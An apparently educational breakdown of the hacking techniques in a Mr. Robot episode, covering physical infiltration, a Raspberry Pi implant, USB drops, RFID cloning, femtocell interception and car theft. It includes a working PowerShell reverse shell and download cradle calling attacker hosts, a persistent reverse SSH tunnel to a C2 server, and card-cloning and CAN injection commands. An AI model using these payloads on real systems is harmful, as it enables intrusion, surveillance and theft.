# Episode 4: eps1.3_da3m0ns.mp4

## Overview

fsociety advances its plan to destroy E Corp's data by preparing a physical infiltration of Steel Mountain, E Corp's highly secured data storage facility in upstate New York. Elliot, operating under the alias "Sam Sepiol," must gain physical entry through social engineering. The episode details the preparation of hardware implants, femtocell exploitation, USB drop attacks, and RFID reconnaissance, all critical components of a sophisticated multi-vector attack against both the digital and physical infrastructure of the target.

---

## Hacks & Techniques

### 1. Steel Mountain Physical Infiltration Planning

The physical penetration of Steel Mountain requires extensive planning, combining social engineering with technical preparation. Physical security testing (sometimes called "red team" operations) is a recognized discipline within professional security assessments.

**Pre-infiltration intelligence gathering:**

- **Facility layout mapping**: Using satellite imagery, publicly filed architectural plans, fire safety inspections, and environmental impact assessments to understand the building's layout, entry points, and internal structure
- **Security posture assessment**: Identifying guard stations, CCTV camera placements, mantrap configurations, biometric access controls, and visitor management procedures
- **Employee profiling**: Researching key employees who might be encountered during the infiltration, including their names, roles, reporting structure, and personality traits that could be leveraged
- **Cover story development**: Creating a comprehensive, verifiable false identity and pretext that justifies physical access to sensitive areas
- **Timing analysis**: Identifying optimal windows for infiltration based on shift changes, staffing levels, and operational patterns

**Physical security layers at Steel Mountain:**

```
Layer 1: Perimeter (fence, gate, guard booth, vehicle barriers)
    |
Layer 2: Building entrance (reception, visitor log, metal detector)
    |
Layer 3: Access-controlled zones (badge readers, mantraps)
    |
Layer 4: Data center floor (biometric, escort required)
    |
Layer 5: Server racks/tape storage (cage locks, cameras)
```

### 2. Social Engineering Pretext as "Sam Sepiol"

Elliot assumes the identity of "Sam Sepiol," supposedly a representative from BansheeNet, a fictional technology company, to gain access to Steel Mountain. This demonstrates a sophisticated social engineering attack that combines a false identity with a plausible business pretext.

**Social engineering pretext components:**

- **Identity creation**: A complete fake identity including business cards, a LinkedIn profile, a company email address, and a phone number that rings to a confederate who will confirm the cover story
- **Company backstory**: BansheeNet is presented as a technology services provider with a legitimate reason to visit the facility (e.g., evaluating services, conducting an audit, or performing maintenance)
- **Wardrobe and demeanor**: Dressing appropriately for the role, projecting confidence and authority, and displaying familiarity with industry terminology
- **Conversation control**: Steering interactions to avoid difficult questions while appearing natural and cooperative
- **Escape plans**: Prepared responses for challenging situations and a plan for graceful extraction if the pretext begins to fail

**Key social engineering principles leveraged:**

| Principle | Application |
|-----------|-------------|
| Authority | Representing a company with an implied business relationship |
| Social proof | Name-dropping real employees or referencing legitimate projects |
| Likability | Building rapport with guards and staff through friendly conversation |
| Reciprocity | Offering something (business card, compliment, small favor) before making requests |
| Commitment/Consistency | Getting small "yes" responses before asking for larger access grants |
| Scarcity/Urgency | Implying time-sensitive business needs to rush security procedures |

### 3. Raspberry Pi Implant with Cellular Modem for HVAC Access

A central element of the Steel Mountain attack is a Raspberry Pi single-board computer configured as a network implant. The device is designed to be physically planted inside the facility's network, providing remote access to the HVAC (Heating, Ventilation, and Air Conditioning) systems.

**Raspberry Pi implant specifications:**

- **Hardware**: Raspberry Pi (Model B or later) with a cellular modem (3G/4G USB dongle or HAT module) for out-of-band communication that does not depend on the target's network for internet connectivity
- **Operating system**: Minimal Linux distribution (e.g., Kali Linux ARM or Raspbian Lite) configured for headless operation
- **Networking**: Configured to connect to the target's internal network via Ethernet while simultaneously maintaining a cellular data connection to the attacker's infrastructure
- **Power**: Powered via USB from the facility's infrastructure (a wall outlet, network equipment, or PoE adapter)
- **Persistence**: Configured to automatically start its payload on boot, reconnect if connectivity is lost, and survive power cycling

**Attack flow:**

```
1. Physical placement of Raspberry Pi on Steel Mountain network
2. Pi connects to internal HVAC/BMS network segment via Ethernet
3. Pi establishes reverse SSH tunnel over cellular to fsociety C2
4. fsociety gains remote access to internal HVAC controls
5. Temperature manipulation causes physical damage to tape storage
```

**Why target HVAC systems:**

- HVAC and Building Management Systems (BMS) are frequently on flat networks with minimal segmentation from IT infrastructure
- These systems often run legacy software with known vulnerabilities and no patches
- Disrupting temperature control in a data center can cause physical damage to hardware and storage media
- Magnetic tape storage (used for backups) is particularly sensitive to temperature and humidity extremes

### 4. Femtocell Exploitation for Cellular Interception

The episode references femtocell technology and its exploitation for intercepting cellular communications, providing the team with the ability to monitor phone calls and text messages in the target area.

**What is a femtocell:**

A femtocell is a small, low-power cellular base station typically provided by carriers for improving indoor coverage. It connects to the carrier's network via the customer's broadband internet connection and serves as a miniature cell tower.

**Femtocell exploitation:**

- **Rogue femtocell**: A modified femtocell that tricks nearby phones into connecting to it instead of legitimate cell towers, enabling man-in-the-middle attacks on cellular communications
- **Traffic interception**: Once phones connect to the rogue femtocell, voice calls, SMS messages, and data traffic pass through the attacker's device
- **IMSI catching**: The femtocell can capture IMSI (International Mobile Subscriber Identity) numbers, uniquely identifying connected devices and their owners
- **Downgrade attacks**: Forcing connected devices to use weaker encryption (A5/1 instead of A5/3) or unencrypted connections

**Technical details:**

| Component | Description |
|-----------|-------------|
| Hardware | Modified commercial femtocell or software-defined radio (SDR) |
| Software | OpenBTS, osmocom, or custom firmware |
| Range | 10-50 meters (indoor), potentially more with amplification |
| Bands | Depends on target carrier (700MHz, 850MHz, 1900MHz, etc.) |
| Attack type | Man-in-the-middle on cellular protocol layer |

### 5. USB Rubber Ducky Drop Attack

fsociety prepares USB Rubber Ducky devices to be "dropped" in the Steel Mountain parking lot, exploiting human curiosity to gain code execution on employee workstations.

**USB Rubber Ducky explained:**

The USB Rubber Ducky (by Hak5) is a keystroke injection attack platform disguised as a regular USB flash drive. When plugged into a computer, the operating system recognizes it as a USB HID (Human Interface Device) keyboard, not a storage device. It then executes a pre-programmed sequence of keystrokes at superhuman speed.

**How the attack works:**

1. **Preparation**: The attacker writes a payload script in Ducky Script (a simple scripting language) that types commands to download and execute malware, create backdoor accounts, exfiltrate data, or establish reverse shells
2. **Deployment**: Devices are "dropped" in locations where target employees will find them (parking lots, lobbies, break rooms, restrooms)
3. **Social engineering trigger**: Natural human curiosity compels the finder to plug the USB device into their computer to identify its owner or contents
4. **Execution**: The Rubber Ducky types its payload within seconds of being plugged in, faster than the user can react
5. **Persistence**: The payload typically establishes a persistent backdoor that survives removal of the USB device

**Example Ducky Script payload:**

```
REM Open PowerShell and download reverse shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER
```

**Success rates:**

Research by CompTIA (2015) found that 17% of dropped USB drives were plugged in by finders, with some studies reporting rates as high as 45-60% depending on the environment and device labeling.

### 6. RFID Badge Systems Reconnaissance

The team performs reconnaissance on Steel Mountain's RFID-based access control system to understand the technology in use and identify potential cloning or bypass techniques.

**RFID access control overview:**

- **Low-frequency (125 kHz)**: Legacy systems using HID ProxCard, EM4100, or similar. These cards transmit a static ID number with no encryption or authentication, making them trivially clonable.
- **High-frequency (13.56 MHz)**: Modern systems using MIFARE, DESFire, iCLASS, or similar. These support encryption and mutual authentication but may have implementation vulnerabilities.
- **Ultra-high-frequency (UHF)**: Used primarily for long-range vehicle access or asset tracking rather than personnel access control.

**Reconnaissance objectives:**

- Identify the RFID technology in use (frequency, protocol, manufacturer)
- Determine if the system uses card-only or card-plus-PIN authentication
- Assess whether anti-cloning measures are implemented
- Identify potential relay or replay attack opportunities
- Map which cards grant access to which areas

### 7. SCADA/ICS Network Concepts

The Steel Mountain attack introduces concepts from industrial control system (ICS) and SCADA (Supervisory Control and Data Acquisition) security, as the HVAC systems targeted are part of the facility's operational technology (OT) infrastructure.

**SCADA/ICS characteristics relevant to the attack:**

- **IT/OT convergence**: Modern building management systems increasingly connect to IP networks, creating bridges between corporate IT and operational technology
- **Legacy protocols**: BACnet, Modbus, LonWorks, and other ICS protocols were designed for reliability, not security, and often lack authentication or encryption
- **Long lifecycles**: ICS equipment may operate for 15-25 years, far outliving its security support window
- **Flat networks**: Many facilities lack proper segmentation between IT, OT, and building management networks
- **Physical consequences**: Unlike purely digital attacks, compromising ICS systems can cause real-world physical damage

### 8. Car Theft via 315 MHz Signal Replay and CAN Bus

Romero steals a minivan for the road trip to Steel Mountain by using electronic tools to bypass the vehicle's security systems without a physical key.

**1. 315 MHz Key Fob Signal Replay:**

Romero uses a 315 MHz radio transceiver to intercept the owner's key fob unlock signal, then replays it to unlock the vehicle. 315 MHz is the standard frequency for North American automotive key fobs. Older vehicles use static codes that are trivially replayable — simply record the signal and play it back. Newer rolling-code systems can be defeated with the **RollJam** technique (developed by Samy Kamkar, presented at DEF CON 23, 2015). RollJam works by simultaneously jamming the legitimate signal while recording it, preventing the vehicle from receiving it. The attacker then replays the unused (still valid) code later to unlock the car.

**2. CAN Bus Access via OBD-II:**

Once inside the vehicle, Romero plugs a laptop into the OBD-II (On-Board Diagnostics) port for direct CAN (Controller Area Network) bus access. The CAN bus is the vehicle's internal communication network connecting all electronic control units (ECUs). Using `candump` from the Linux can-utils package, Romero reads and injects CAN messages to start the engine without a physical key.

**CAN bus interaction example:**

```bash
# Read CAN bus traffic
candump can0

# Send unlock command (example CAN frame)
cansend can0 000#00.00.00.01

# Start engine (inject ignition CAN message)
cansend can0 000#00.00.00.02
```

**Real-world parallels:**

- **Samy Kamkar's RollJam**: A $32 device demonstrated at DEF CON 23 (2015) that defeats rolling-code key fob systems used by most modern vehicles and garage doors
- **Charlie Miller & Chris Valasek Jeep Cherokee Remote Hack (2015)**: Demonstrated remote vehicle takeover via cellular connection, leading to a 1.4 million vehicle recall by Chrysler
- **Tesla Key Fob Cloning (KU Leuven, 2018)**: Researchers at KU Leuven demonstrated cloning Tesla Model S key fobs by exploiting weak encryption in the PKES (Passive Keyless Entry and Start) system

---

## Tools Used

| Tool | Purpose | Category |
|------|---------|----------|
| Raspberry Pi | Network implant hardware platform | Hardware Hacking |
| Cellular modem (3G/4G) | Out-of-band C2 communication | Communication |
| USB Rubber Ducky (Hak5) | Keystroke injection attack via USB HID | Physical Attack |
| Femtocell (modified) | Rogue cellular base station for interception | Wireless Hacking |
| RFID reader/scanner | Access card reconnaissance | Physical Security |
| Kali Linux (ARM) | Offensive security OS for Raspberry Pi | Operating System |
| Social engineering toolkit | Pretext materials (fake IDs, business cards) | Social Engineering |
| Google Earth / Maps | Physical facility reconnaissance | OSINT |

---

## Commands Shown

### Raspberry Pi implant configuration
```bash
# Configure Raspberry Pi for headless operation
# Set up auto-login and payload execution on boot
sudo systemctl enable ssh

# Configure cellular modem
sudo apt install ppp usb-modeswitch
sudo wvdialconf /etc/wvdial.conf

# Set up reverse SSH tunnel on boot (via systemd service)
# /etc/systemd/system/reverse-tunnel.service
# ExecStart=/usr/bin/ssh -N -R 2222:localhost:22 user@c2server.com -i /root/.ssh/key

# Network configuration for dual interfaces
# eth0: connects to target's internal network (DHCP)
# ppp0: cellular connection to internet for C2

# Configure persistent reverse shell
cat >> /etc/rc.local << 'EOF'
while true; do
    ssh -N -R 2222:localhost:22 -o ServerAliveInterval=60 \
        -o StrictHostKeyChecking=no -i /root/.ssh/c2_key \
        tunnel@c2.fsociety.net 2>/dev/null
    sleep 30
done &
EOF

# Scan the internal network after placement
nmap -sn 192.168.1.0/24
nmap -sV -p 47808 192.168.1.0/24  # BACnet default port
```

### USB Rubber Ducky payload (Ducky Script)
```
REM Steel Mountain USB Drop Payload
REM Opens hidden PowerShell and establishes reverse shell
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING $c=New-Object Net.Sockets.TCPClient('c2.fsociety.net',443);
STRING $s=$c.GetStream();
STRING [byte[]]$b=0..65535|%{0};
STRING while(($i=$s.Read($b,0,$b.Length)) -ne 0){
STRING $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
STRING $r=(iex $d 2>&1|Out-String);
STRING $r2=$r+'PS '+(pwd).Path+'> ';
STRING $sb=([Text.Encoding]::ASCII).GetBytes($r2);
STRING $s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
ENTER
```

### Femtocell setup (conceptual)
```bash
# Using OpenBTS on a software-defined radio platform
# Configure the rogue base station
sudo OpenBTS &

# Monitor connected devices (IMSI catcher functionality)
sudo OpenBTSCLI
OpenBTS> tmsis read

# Capture and log all SMS messages
# Messages pass through the rogue BTS in plaintext

# Force downgrade to unencrypted GSM
# Modify BTS configuration to disable A5/1 encryption
```

### RFID reconnaissance
```bash
# Using Proxmark3 for RFID analysis
# Detect card type and frequency
proxmark3> lf search
proxmark3> hf search

# Read low-frequency HID ProxCard
proxmark3> lf hid read

# Clone a captured card to a blank T5577
proxmark3> lf hid clone 2006XXXXXXXX

# For high-frequency cards (MIFARE Classic)
proxmark3> hf mf chk *1 ? t  # Check for default keys
proxmark3> hf mf dump         # Dump card contents
```

---

## Real-World Parallels

### Physical Penetration Testing
Professional red team firms routinely conduct physical penetration tests similar to the Steel Mountain infiltration. Jayson E. Street, a well-known penetration tester, has documented numerous cases of walking into banks, corporate offices, and government facilities using social engineering pretexts. His conference talks detail how he successfully accessed server rooms and planted devices at organizations that hired him to test their security. The Social Engineering Community (social-engineer.org) maintains a framework for physical penetration testing methodologies.

### USB Drop Attacks
The USB Rubber Ducky attack depicted is directly based on real hardware sold by Hak5. In 2016, researchers at the University of Illinois conducted a study where they dropped 297 USB drives around campus and found that 48% were picked up and plugged in, with the first drive being connected within six minutes. The 2008 US Department of Defense breach (Operation Buckshot Yankee) began when an infected USB drive was inserted into a military laptop at a base in the Middle East, leading to the most significant breach of US military computers at the time. This incident led to the creation of US Cyber Command.

### Femtocell Vulnerabilities
In 2013, security researchers at iSEC Partners (now NCC Group) demonstrated at Black Hat USA that commercially available Verizon femtocells could be modified to intercept phone calls, SMS messages, and data from any Verizon phone that connected to them. The research showed that femtocells could be purchased cheaply on eBay and reprogrammed with custom firmware. Similarly, IMSI catchers (also known as Stingrays) are used by law enforcement agencies worldwide, with the Harris Corporation's Stingray device being the most well-known commercial product.

### Raspberry Pi Network Implants
Raspberry Pi-based network implants are standard tools in professional penetration testing. Products like the Pwn Plug (by Pwnie Express) and the LAN Turtle (by Hak5) commercialize this concept. In 2019, NASA's Jet Propulsion Laboratory was breached via an unauthorized Raspberry Pi connected to its network, which the attacker used to move laterally and access mission systems for approximately 10 months before detection.

### SCADA/ICS Attacks
The targeting of building management and HVAC systems echoes real-world incidents. The 2013 Target retail breach began through compromised HVAC vendor credentials. In 2014, a German steel mill suffered physical damage when hackers compromised the plant's control systems and prevented a blast furnace from shutting down properly. The 2015 and 2016 attacks on Ukraine's power grid (attributed to Russian hackers) demonstrated that SCADA systems could be manipulated to cause widespread physical infrastructure disruption.

---

## Tool Links

- **USB Rubber Ducky**: https://shop.hak5.org/products/usb-rubber-ducky
- **LAN Turtle**: https://shop.hak5.org/products/lan-turtle
- **Proxmark3**: https://proxmark.com/
- **Tastic RFID Thief**: https://www.bishopfox.com/blog/tastic-rfid-thief
- **HID iCLASS**: hardware tool (proprietary RFID access control system)
- **Kali Linux**: https://www.kali.org/
- **Nmap**: https://nmap.org/
- **SET (Social Engineering Toolkit)**: https://github.com/trustedsec/social-engineer-toolkit
- **BACnet tools**: https://sourceforge.net/projects/bacnet/
- [can-utils](https://github.com/linux-can/can-utils) - Linux CAN bus utilities for vehicle network analysis
- [RollJam](https://samy.pl/rolljam/) - Samy Kamkar's 315/433 MHz rolling code bypass device
- [HackRF](https://greatscottgadgets.com/hackrf/) - SDR for 315 MHz signal capture and replay

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Physical infiltration via social engineering | T1566 | Phishing | https://attack.mitre.org/techniques/T1566/ |
| Social engineering pretext as Sam Sepiol | T1036 | Masquerading | https://attack.mitre.org/techniques/T1036/ |
| Raspberry Pi network implant | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |
| USB Rubber Ducky keystroke injection | T1091 | Replication Through Removable Media | https://attack.mitre.org/techniques/T1091/ |
| USB Rubber Ducky user execution | T1204 | User Execution | https://attack.mitre.org/techniques/T1204/ |
| Femtocell cellular interception | T1557 | Adversary-in-the-Middle | https://attack.mitre.org/techniques/T1557/ |
| RFID badge cloning reconnaissance | T1120 | Peripheral Device Discovery | https://attack.mitre.org/techniques/T1120/ |
| SCADA/BACnet network targeting | T1602 | Data from Configuration Repository | https://attack.mitre.org/techniques/T1602/ |
| Facility physical security reconnaissance | T1592 | Gather Victim Host Information | https://attack.mitre.org/techniques/T1592/ |
| Employee profiling for social engineering | T1589 | Gather Victim Identity Information | https://attack.mitre.org/techniques/T1589/ |
| Reverse SSH tunnel for C2 | T1572 | Protocol Tunneling | https://attack.mitre.org/techniques/T1572/ |
| Network scanning from implant | T1046 | Network Service Discovery | https://attack.mitre.org/techniques/T1046/ |
| Vehicle signal replay attack | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |

---

## References and Further Reading

- **Hak5 USB Rubber Ducky Documentation**: https://docs.hak5.org/usb-rubber-ducky/
- **University of Illinois USB Drop Study (2016)**: https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/tischer
- **Operation Buckshot Yankee (2008 DoD Breach)**: https://www.wired.com/2010/08/insiders-doubt-2008-pentagon-hack-was-foreign-spy-attack/
- **Black Hat USA 2013 - Femtocell Hacking (iSEC Partners)**: https://www.blackhat.com/us-13/
- **NASA JPL Raspberry Pi Breach (2019)**: https://oig.nasa.gov/docs/IG-19-022.pdf
- **Target HVAC Breach (2013)**: https://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/
- **German Steel Mill Cyber Attack (2014) - BSI Report**: https://www.bsi.bund.de/
- **Bishop Fox - Tastic RFID Thief**: https://www.bishopfox.com/blog/tastic-rfid-thief
- **DHS ICS-CERT Advisories on BACnet**: https://www.cisa.gov/uscert/ics
- **Jayson E. Street - Physical Penetration Testing Talks**: https://www.yourfriendlyneighborhoodhacker.com/
- **SANS - ICS/SCADA Security Resources**: https://www.sans.org/ics/

---

## Search Tags

```
tags: [social engineering, physical penetration testing, Raspberry Pi, network implant, USB Rubber Ducky, femtocell, IMSI catcher, RFID cloning, Proxmark3, HID ProxCard, Kali Linux, BACnet, SCADA, ICS, HVAC hacking, Steel Mountain, reverse SSH tunnel, cellular modem, SET, can-bus, OBD-II, RollJam, 315MHz, car-hacking, vehicle-theft, key-fob-replay]
season: 1
episode: 4
mitre: [T1566, T1036, T1200, T1091, T1204, T1557, T1120, T1602, T1592, T1589, T1572, T1046]
```